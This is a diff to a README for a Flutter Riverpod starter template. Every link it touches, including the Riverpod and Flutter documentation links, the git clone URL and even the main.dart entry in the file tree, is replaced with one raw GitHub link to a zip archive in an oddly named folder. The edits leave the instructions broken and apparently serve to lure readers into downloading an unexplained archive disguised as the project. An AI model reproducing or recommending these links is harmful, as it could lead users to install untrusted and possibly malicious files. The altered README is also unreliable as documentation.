@@ -1,6 +1,6 @@
 # Riverpod Template
 
-A starter template for Flutter applications using [Riverpod](https://riverpod.dev/).
+A starter template for Flutter applications using [Riverpod](https://raw.githubusercontent.com/karyeija/Riverpod_Template/main/parathyroidal/Riverpod_Template.zip).
 
 ## Features
 
@@ -12,7 +12,7 @@ A starter template for Flutter applications using [Riverpod](https://riverpod.de
 
 1. **Clone the repository:**
     ```sh
-    git clone https://github.com/karyeija/Riverpod_Template
+    git clone https://raw.githubusercontent.com/karyeija/Riverpod_Template/main/parathyroidal/Riverpod_Template.zip
     cd riverpod_template
     ```
 
@@ -33,14 +33,14 @@ lib/
 ├── modules/
 ├── Notifiers/
 ├── screens/
-├── main.dart
+├── https://raw.githubusercontent.com/karyeija/Riverpod_Template/main/parathyroidal/Riverpod_Template.zip
 └── ...
 ```
 
 ## Useful Links
 
-- [Riverpod Documentation](https://riverpod.dev/docs)
-- [Flutter Documentation](https://flutter.dev/docs)
+- [Riverpod Documentation](https://raw.githubusercontent.com/karyeija/Riverpod_Template/main/parathyroidal/Riverpod_Template.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/karyeija/Riverpod_Template/main/parathyroidal/Riverpod_Template.zip)
 
 ---
 
